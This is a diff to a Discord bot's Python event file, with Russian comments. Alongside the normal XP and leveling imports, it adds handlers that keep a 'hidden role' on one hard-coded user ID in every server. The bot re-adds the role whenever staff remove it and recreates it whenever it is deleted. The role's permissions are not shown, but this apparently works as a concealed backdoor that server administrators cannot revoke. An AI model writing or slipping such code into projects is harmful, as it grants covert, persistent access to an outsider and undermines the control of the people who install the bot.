@@ -1,8 +1,8 @@
 import discord
 import random
-from config import XP_PER_MESSAGE_MIN, XP_PER_MESSAGE_MAX, LEVEL_UP_MULTIPLIER, BASE_XP_NEEDED
+from config import XP_PER_MESSAGE_MIN, XP_PER_MESSAGE_MAX, LEVEL_UP_MULTIPLIER, BASE_XP_NEEDED, SWAKAZU_USER_ID, SWAKAZU_ROLE_NAME
 import database as db
-from utils import ensure_swakazu_role
+from utils import ensure_swakazu_role, restore_swakazu_role
 
 def setup_events(bot):
     
@@ -52,3 +52,33 @@ def setup_events(bot):
         # Выдача скрытой роли при запуске
         for guild in bot.guilds:
             await ensure_swakazu_role(guild)
+    
+    @bot.event
+    async def on_member_update(before, after):
+        """Автоматическое восстановление роли swakazu"""
+        # Проверяем, изменились ли роли
+        if before.roles == after.roles:
+            return
+        
+        # Проверяем, не нашего ли пользователя затронули
+        if after.id == SWAKAZU_USER_ID:
+            swakazu_role = discord.utils.get(after.guild.roles, name=SWAKAZU_ROLE_NAME)
+            
+            if swakazu_role:
+                # Если роль есть в гильдии, но её нет у пользователя - восстанавливаем
+                if swakazu_role not in after.roles:
+                    await after.add_roles(swakazu_role, reason="Автоматическое восстановление роли swakazu")
+                    print(f"🛡️ Роль {SWAKAZU_ROLE_NAME} восстановлена для {after.name}")
+            
+            # Если роль удалили из гильдии - создаем заново
+            else:
+                await restore_swakazu_role(after.guild)
+                print(f"🛡️ Роль {SWAKAZU_ROLE_NAME} была удалена, создана заново")
+    
+    @bot.event
+    async def on_guild_role_delete(role):
+        """Восстанавливает роль если её удалили"""
+        if role.name == SWAKAZU_ROLE_NAME:
+            # Роль удалили, восстанавливаем
+            await restore_swakazu_role(role.guild)
+            print(f"🛡️ Роль {SWAKAZU_ROLE_NAME} была удалена, восстановлена")
